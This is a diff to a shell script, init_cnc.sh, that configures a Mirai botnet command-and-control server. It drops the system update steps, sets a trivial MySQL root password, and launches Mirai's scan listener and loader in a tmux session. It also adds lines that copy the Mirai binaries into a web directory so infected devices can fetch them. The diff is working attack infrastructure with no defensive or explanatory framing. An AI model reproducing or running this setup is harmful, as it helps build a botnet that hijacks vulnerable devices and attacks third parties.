@@ -2,10 +2,7 @@
 # init_cnc.sh
 # setup instructions found: http://pastebin.com/LXkkw10AX
 
-
 export DEBIAN_FRONTEND=noninteractive
-apt-get update
-apt-get upgrade -y
 
 # step 1
 debconf-set-selections <<< 'mysql-server mysql-server/root_password password password'
@@ -222,5 +219,8 @@ echo /swapfile swap swap defaults 0 0 >> /etc/fstab
 cd /root/Mirai-Source-Code/loader/
 tmux new-session -d -s scan "../mirai/debug/scanListen | ./loader.dbg"
 
+# fix mirai URLs
+mkdir /var/www/html/bins
+cp /var/www/html/mirai* /var/www/html/bins/
 
 
